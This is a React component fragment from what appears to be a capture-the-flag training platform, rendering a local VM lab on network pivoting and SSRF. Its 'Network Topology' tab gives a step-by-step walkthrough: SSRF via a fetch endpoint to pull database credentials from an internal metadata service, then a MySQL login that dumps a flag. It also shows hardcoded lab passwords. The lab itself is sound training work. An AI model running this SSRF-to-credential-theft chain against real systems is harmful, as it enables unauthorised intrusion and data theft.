                        {copiedSnippet === 's7_native_clean' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Stage 8: Core Infrastructure Breach (Network Pivoting & SSRF) */}
          {challenge.stage_number === 8 && (
            <div className="cyber-panel p-5 sm:p-6 space-y-5 bg-[#0E1217] border border-[#242C37]">
              {/* Header & Quick Action Launchers */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#232B36] pb-4">
                <div>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-[#FF6B00]/20 text-[#FF8533] border border-[#FF6B00]/40 uppercase tracking-wider">
                      Capstone Infrastructure Breach
                    </span>
                    <span className="text-[10px] font-mono text-[#10B981] bg-[#10B981]/15 px-2 py-0.5 rounded border border-[#10B981]/30">
                      QEMU / KVM Accelerated VM
                    </span>
                  </div>
                  <h3 className="font-sans text-lg font-bold text-[#F5F5F5] flex items-center gap-2">
                    <span className="text-[#FF6B00]">⚡</span> NexaCorp Core Infrastructure Connection Hub
                  </h3>
                  <p className="text-xs text-[#8B949E] font-sans mt-0.5">
                    Isolated virtual machine cluster with internal pivoting network. Connect via browser terminal, direct SSH, or an external Kali Linux VM.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2 flex-shrink-0">
                  <a
                    href="http://localhost:7681"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="btn-primary text-xs font-mono font-bold px-3.5 py-2 flex items-center gap-1.5 shadow-[0_0_14px_rgba(255,107,0,0.25)]"
                  >
                    🖥️ BROWSER TERMINAL
                  </a>
                  <a
                    href="http://localhost:3008"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="btn-secondary text-xs font-mono font-bold px-3.5 py-2 flex items-center gap-1.5"
                  >
                    🌐 ENTRY HOST (3008)
                  </a>
                </div>
              </div>

              {/* Navigation Tabs */}
              <div className="flex flex-wrap gap-1.5 border-b border-[#232B36] pb-2 text-xs font-mono">
                <button
                  type="button"
                  onClick={() => setStage8Tab('terminal')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage8Tab === 'terminal'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  🖥️ Browser PwnBox
                </button>
                <button
                  type="button"
                  onClick={() => setStage8Tab('ssh')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage8Tab === 'ssh'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  🔑 SSH Password Login
                </button>
                <button
                  type="button"
                  onClick={() => setStage8Tab('kali')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage8Tab === 'kali'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  🐉 Kali Linux VM Setup
                </button>
                <button
                  type="button"
                  onClick={() => setStage8Tab('network')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage8Tab === 'network'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  🌐 Network Topology &amp; SSRF
                </button>
                <button
                  type="button"
                  onClick={() => setStage8Tab('vm')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage8Tab === 'vm'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  ⚙️ VM Runner Commands
                </button>
              </div>

              {/* Tab 1: Browser PwnBox Terminal */}
              {stage8Tab === 'terminal' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-[#F5F5F5] text-sm flex items-center gap-2">
                        <span className="w-2.5 h-2.5 rounded-full bg-[#10B981] animate-pulse"></span>
                        HTB / TryHackMe Style In-Browser Attack Console
                      </span>
                      <span className="text-[11px] text-[#FF8533] bg-[#FF6B00]/10 px-2 py-0.5 rounded border border-[#FF6B00]/30">
                        Port 7681 (WebSockets + xterm.js)
                      </span>
                    </div>
                    <p className="text-[#8B949E] text-xs font-sans leading-relaxed">
                      Launches an interactive bash console in your browser connected directly to the Ubuntu Virtual Machine (<code className="text-[#10B981]">shadownet@shadownet-stage8-vm</code>). Host filesystem directories are strictly hidden—you only see the challenge workspace in <code className="text-[#FF9F43]">~/challenge/</code>.
                    </p>
                    <div className="pt-2 flex flex-col sm:flex-row items-center gap-3">
                      <a
                        href="http://localhost:7681"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="btn-primary w-full sm:w-auto text-xs font-bold py-2.5 px-5 flex items-center justify-center gap-2"
                      >
                        🖥️ Open In-Browser Terminal (http://localhost:7681)
                      </a>
                      <span className="text-[11px] text-[#8B949E] font-sans">
                        Opens in a separate tab with responsive full-window layout.
                      </span>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg">
                      <span className="text-[10px] text-[#8B949E] block mb-1">TERMINAL ACCESS</span>
                      <span className="text-[#F5F5F5] font-bold">Web PTY Console</span>
                    </div>
                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg">
                      <span className="text-[10px] text-[#8B949E] block mb-1">CHALLENGE DIRECTORY</span>
                      <span className="text-[#10B981] font-bold">/home/shadownet/challenge</span>
                    </div>
                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg">
                      <span className="text-[10px] text-[#8B949E] block mb-1">VM ENVIRONMENT</span>
                      <span className="text-[#FF9F43] font-bold">Ubuntu 22.04 LTS (QEMU)</span>
                    </div>
                  </div>
                </div>
              )}

              {/* Tab 2: Direct SSH Password Login */}
              {stage8Tab === 'ssh' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-[#F5F5F5] text-sm flex items-center gap-2">
                        <span>🔑</span> Local Host SSH Access
                      </span>
                      <button
                        type="button"
                        onClick={() =>
                          copyToClipboard(
                            'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2228 shadownet@localhost',
                            'local_ssh'
                          )
                        }
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-2.5 py-1 rounded border border-[#FF9F43]/40 cursor-pointer font-bold transition-all"
                      >
                        {copiedSnippet === 'local_ssh' ? '✓ Copied!' : '📋 Copy SSH Command'}
                      </button>
                    </div>
                    <div className="p-2.5 bg-[#050709] border border-[#232B36] rounded-lg select-all text-[#10B981] overflow-x-auto">
                      <code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2228 shadownet@localhost</code>
                    </div>
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-1 text-[11px]">
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">HOST</span>
                        <strong className="text-[#F5F5F5]">localhost (127.0.0.1)</strong>
                      </div>
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">PORT</span>
                        <strong className="text-[#FF8533]">2228</strong>
                      </div>
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">USERNAME</span>
                        <strong className="text-[#10B981]">shadownet</strong>
                      </div>
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">PASSWORD</span>
                        <strong className="text-[#FF9F43] select-all">password123</strong>
                      </div>
                    </div>
                  </div>

                  <div className="p-3.5 bg-[#080A0D] border border-[#232B36] rounded-xl flex items-center justify-between">
                    <div>
                      <span className="text-[#F5F5F5] font-bold block">One-Click SSH Wrapper Script</span>
                      <span className="text-[#8B949E] text-[11px] font-sans">Automatically cleans known_hosts fingerprints and opens shell</span>
                    </div>
                    <button
                      type="button"
                      onClick={() => copyToClipboard('./stages/stage8-network/ssh_vm.sh', 'ssh_script')}
                      className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-3 py-1.5 rounded border border-[#FF9F43]/40 cursor-pointer font-bold"
                    >
                      {copiedSnippet === 'ssh_script' ? '✓ Copied!' : '📋 ./stages/stage8-network/ssh_vm.sh'}
                    </button>
                  </div>
                </div>
              )}

              {/* Tab 3: Kali Linux VM Access */}
              {stage8Tab === 'kali' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-[#F5F5F5] text-sm flex items-center gap-2">
                        <span>🐉</span> External Kali Linux / Attacker VM Access
                      </span>
                      <button
                        type="button"
                        onClick={() =>
                          copyToClipboard(
                            'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2228 shadownet@<HOST_IP>',
                            'kali_ssh'
                          )
                        }
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-2.5 py-1 rounded border border-[#FF9F43]/40 cursor-pointer font-bold"
                      >
                        {copiedSnippet === 'kali_ssh' ? '✓ Copied!' : '📋 Copy Kali Command'}
                      </button>
                    </div>
                    <p className="text-[#8B949E] text-xs font-sans leading-relaxed">
                      QEMU listens across all host network adapters (<code className="text-[#10B981]">0.0.0.0:2228</code>). If you run Kali Linux in VirtualBox, VMware, or as a secondary machine on your LAN, connect using your host system’s IP address.
                    </p>
                    <div className="p-2.5 bg-[#050709] border border-[#232B36] rounded-lg select-all text-[#10B981] overflow-x-auto">
                      <code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2228 shadownet@&lt;HOST_IP&gt;</code>
                    </div>
                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg space-y-1 font-sans text-xs text-[#8B949E]">
                      <span className="text-[#FF8533] font-bold block font-mono text-[11px]">FINDING YOUR HOST IP:</span>
                      <span>Run <code className="text-[#F5F5F5] font-mono">hostname -I</code> on your host machine to get your LAN IP (e.g., <code className="text-[#10B981] font-mono">192.168.8.127</code> or VirtualBox Host-Only <code className="text-[#10B981] font-mono">192.168.56.1</code>).</span>
                    </div>
                  </div>
                </div>
              )}

              {/* Tab 4: Network Topology & Pivoting Walkthrough */}
              {stage8Tab === 'network' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="font-bold text-[#F5F5F5] text-sm block">
                      🌐 Isolated Subnet Architecture &amp; Pivot Path
                    </span>
                    <div className="p-3 bg-[#050709] border border-[#232B36] rounded-lg overflow-x-auto text-[11px] leading-relaxed text-[#8B949E]">
                      <pre className="text-[#E2E8F0]">{`[ATTACKER SHELL / PWNBOX]
      │
      ├── SSH Access:      port 2228 (shadownet:password123)
      └── Web Terminal:    port 7681 (http://localhost:7681)
      │
      ▼
[PERIMETER ENTRY HOST: shadownet-stage8-vm]
      • Entry URL Fetcher: http://localhost:3008 (port 3000)
      • Vulnerable API:    /fetch?url=<INTERNAL_TARGET>
      │
      │  (Isolated Internal Subnet: 192.168.100.0/24)
      ▼
[ISOLATED DATABASE HOST: 192.168.100.10]
      ├── Cloud Metadata:  http://192.168.100.10:8080/metadata/db-credentials
      └── Core MySQL DB:   port 3306 (user: db_user / pass: SecurePass123)`}</pre>
                    </div>

                    <div className="space-y-2 pt-1">
                      <span className="text-[#FF8533] font-bold block text-xs">STEP-BY-STEP EXPLOITATION WALKTHROUGH:</span>
                      <div className="space-y-2 font-sans text-xs text-[#8B949E]">
                        <div className="p-2.5 bg-[#141920] rounded-lg border border-[#232B36] space-y-1">
                          <strong className="text-[#F5F5F5] block font-mono text-[11px]">1. Probe Perimeter Entry Host</strong>
                          <code className="text-[#10B981] font-mono block select-all">curl http://localhost:3008/</code>
                        </div>
                        <div className="p-2.5 bg-[#141920] rounded-lg border border-[#232B36] space-y-1">
                          <strong className="text-[#F5F5F5] block font-mono text-[11px]">2. Exploit SSRF to Extract Database Credentials</strong>
                          <code className="text-[#10B981] font-mono block select-all">curl -s "http://localhost:3008/fetch?url=http://192.168.100.10:8080/metadata/db-credentials"</code>
                        </div>
                        <div className="p-2.5 bg-[#141920] rounded-lg border border-[#232B36] space-y-1">
                          <strong className="text-[#F5F5F5] block font-mono text-[11px]">3. Authenticate to Internal MySQL Database &amp; Dump Flag</strong>
                          <code className="text-[#10B981] font-mono block select-all">mysql -h 192.168.100.10 -u db_user -pSecurePass123 -D nexacorp -e "SELECT flag FROM flags;"</code>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Tab 5: VM Runner Controls */}
              {stage8Tab === 'vm' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="font-bold text-[#F5F5F5] text-sm block">
                      ⚙️ Stage 8 VM Cluster Management Commands
                    </span>
                    <div className="space-y-2.5">
                      <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                        <div>
                          <strong className="text-[#F5F5F5] block text-[11px]">Start Headless VM Cluster (Recommended)</strong>
                          <span className="text-[#8B949E] text-[10px] font-sans">Boots Ubuntu VM with hardware KVM acceleration in background</span>
                        </div>
                        <button
                          type="button"
                          onClick={() => copyToClipboard('./stages/stage8-network/start_stage8_vm.sh --vm', 'start_vm')}
                          className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-3 py-1.5 rounded border border-[#FF9F43]/40 cursor-pointer font-bold"
                        >
                          {copiedSnippet === 'start_vm' ? '✓ Copied!' : '📋 Copy'}
                        </button>
                      </div>

                      <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                        <div>
                          <strong className="text-[#F5F5F5] block text-[11px]">Start VM with Visible Desktop Window (GUI Mode)</strong>
                          <span className="text-[#8B949E] text-[10px] font-sans">Opens native GTK QEMU window displaying Linux boot &amp; login</span>
                        </div>
                        <button
                          type="button"
                          onClick={() => copyToClipboard('./stages/stage8-network/start_stage8_vm.sh --vm --gui', 'start_gui')}
                          className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-3 py-1.5 rounded border border-[#FF9F43]/40 cursor-pointer font-bold"
                        >
                          {copiedSnippet === 'start_gui' ? '✓ Copied!' : '📋 Copy'}
                        </button>
                      </div>

                      <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                        <div>
                          <strong className="text-[#F5F5F5] block text-[11px]">Run Automated Solution / Verification Script</strong>
                          <span className="text-[#8B949E] text-[10px] font-sans">Tests SSRF exfiltration and verifies capstone flag</span>
                        </div>
                        <button
                          type="button"
                          onClick={() => copyToClipboard('python3 stages/stage8-network/solve.py', 'run_solve')}
                          className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#10B981] px-3 py-1.5 rounded border border-[#10B981]/40 cursor-pointer font-bold"
                        >
                          {copiedSnippet === 'run_solve' ? '✓ Copied!' : '📋 Copy'}
                        </button>
                      </div>

                      <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                        <div>
                          <strong className="text-[#F5F5F5] block text-[11px]">Stop Virtual Machine &amp; Web Terminal</strong>
                          <span className="text-[#8B949E] text-[10px] font-sans">Terminates background QEMU process and releases all ports</span>
                        </div>
                        <button
                          type="button"
                          onClick={() => copyToClipboard('./stages/stage8-network/stop_stage8_vm.sh', 'stop_vm')}
                          className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#EF4444] px-3 py-1.5 rounded border border-[#EF4444]/40 cursor-pointer font-bold"
                        >
                          {copiedSnippet === 'stop_vm' ? '✓ Copied!' : '📋 Copy'}
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Flag Submission Form */}
          <FlagSubmitForm
            challengeId={challenge.id}
            solved={challenge.solved}
            onSuccess={fetchChallenge}
          />
        </div>

        {/* Right Column: Tactical Hints & Engagement Protocol */}
        <div className="space-y-6">
          {/* Tactical Hints */}
          <div className="cyber-panel p-5 bg-[#0E1217] space-y-4">
            <div className="flex items-center justify-between border-b border-[#232B36] pb-2.5">
              <h3 className="font-sans text-base font-bold text-[#F5F5F5] flex items-center gap-2">
                <span className="text-[#F59E0B]">💡</span> Tactical Intelligence Hints
              </h3>
              <span className="font-mono text-[10px] text-[#F59E0B] bg-[#F59E0B]/10 px-2 py-0.5 rounded border border-[#F59E0B]/30 font-bold">
                XP PENALTY APPLIES
              </span>
            </div>

            {unlockMessage && (
              <div className="p-2.5 bg-[#F59E0B]/10 border border-[#F59E0B]/30 rounded-lg text-xs text-[#F59E0B] font-mono flex items-center gap-2 animate-fade-in">
                <span>⚡</span>
                <span>{unlockMessage}</span>
              </div>
            )}

            {(hints.length === 0 && (!stageConfig?.hints || stageConfig.hints.length === 0)) ? (
              <p className="font-mono text-xs text-[#8B949E]">
                No tactical intel logged for this target.
              </p>
            ) : (
              <div className="space-y-3 font-mono text-xs">
                {(hints.length > 0 ? hints : (stageConfig?.hints || [])).map((hint) => {
                  const isUnlocked = unlockedHints.has(hint.id);
                  const isCollapsed = collapsedHints.has(hint.id);
                  const penalty = typeof hint.point_penalty === 'number' ? hint.point_penalty : 40;

                  if (!isUnlocked) {
                    return (
                      <div
                        key={hint.id}
                        className="bg-[#141920] border border-[#232B36] rounded-lg p-3.5 space-y-2.5"
                      >
                        <div className="flex items-center justify-between">
                          <span className="font-bold text-[#F5F5F5] text-xs flex items-center gap-1.5 font-sans">
                            <span className="text-[#8B949E]">🔒</span> Classified Intel #{hint.hint_level}
                          </span>
                          <span className="text-[#EF4444] text-[10px] font-bold bg-[#EF4444]/10 px-2 py-0.5 rounded border border-[#EF4444]/25">
                            -{penalty} XP
                          </span>
                        </div>
                        <p className="text-[11px] text-[#8B949E] font-sans leading-relaxed">
                          Encrypted surveillance and tactical intelligence for Stage 0{challenge.stage_number}.
                        </p>
                        <button
                          onClick={() => handleUnlockHint(hint.id, hint.hint_level, penalty)}
                          className="w-full py-2 px-3 bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] border border-[#FF9F43]/40 hover:border-[#FF9F43] rounded font-mono font-bold text-xs flex items-center justify-center gap-2 transition-all cursor-pointer shadow-[0_0_10px_rgba(255,159,67,0.1)]"
                        >
                          <span>🔓</span> Decrypt Intel (-{penalty} XP)
                        </button>
                      </div>
                    );
                  }

                  return (
                    <div
                      key={hint.id}
                      className="bg-[#141920] border border-[#F59E0B]/40 rounded-lg overflow-hidden transition-colors shadow-[0_0_12px_rgba(245,158,11,0.08)]"
                    >
                      <button
                        onClick={() => toggleCollapse(hint.id)}
                        className="w-full text-left p-3 flex items-center justify-between hover:bg-[#1A212B] transition-colors cursor-pointer"
                      >
                        <div className="flex items-center gap-2">
                          <span className="text-[#10B981] text-xs">✓</span>
                          <span className="font-bold text-[#F5F5F5] text-xs font-sans">
                            Tactical Intel #{hint.hint_level}
                          </span>
                        </div>
                        <div className="flex items-center gap-2">
                          <span className="text-[#F59E0B] text-[10px] font-bold">
                            {isCollapsed ? '▼ View' : '▲ Hide'}
                          </span>
                        </div>
                      </button>

                      {!isCollapsed && (
                        <div className="p-3.5 pt-0 text-[#8B949E] border-t border-[#232B36]/50 bg-[#080A0D] animate-fade-in space-y-2">
                          <p className="text-[#F5F5F5] text-xs leading-relaxed pt-2.5 font-sans">
                            {hint.hint_text}
                          </p>
                          <div className="flex items-center justify-between pt-1 border-t border-[#232B36]/30 text-[10px] text-[#8B949E] font-mono">
                            <span>INTEL STATUS: DECRYPTED</span>
                            <span className="text-[#F59E0B] font-bold">COST: {penalty} XP</span>
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            )}
          </div>

          {/* Engagement Protocol */}
          <div className="cyber-panel p-5 font-mono text-xs text-[#8B949E] space-y-2.5 bg-[#0E1217]">
            <h4 className="text-[#F5F5F5] text-base font-bold">
              Rules of Engagement
            </h4>
            <ul className="list-disc list-inside space-y-1.5 text-[11px] leading-relaxed font-sans">
              <li>Execute attacks within assigned sandbox targets only.</li>
              <li>Flag format is case-sensitive: <code className="text-[#FF6B00] font-mono font-bold">SHADOWNET{'{...}'}</code>.</li>
              <li>Submitting the authentic flag unlocks the next NexaCorp defense layer.</li>
            </ul>
          </div>
        </div>
      </div>

    </div>
  );
}

